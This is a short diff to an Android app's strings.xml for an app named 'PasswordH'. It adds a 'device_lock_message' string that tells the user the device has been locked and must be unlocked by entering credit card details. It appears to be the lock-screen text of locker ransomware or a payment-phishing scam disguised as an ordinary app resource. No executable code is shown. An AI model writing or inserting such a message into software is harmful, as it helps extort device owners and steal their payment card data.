@@ -1,3 +1,4 @@
 <resources>
     <string name="app_name">PasswordH</string>
+    <string name="device_lock_message">This Device have been locked !\nIn Order to unlock, enter your credit card details below: </string>
 </resources>
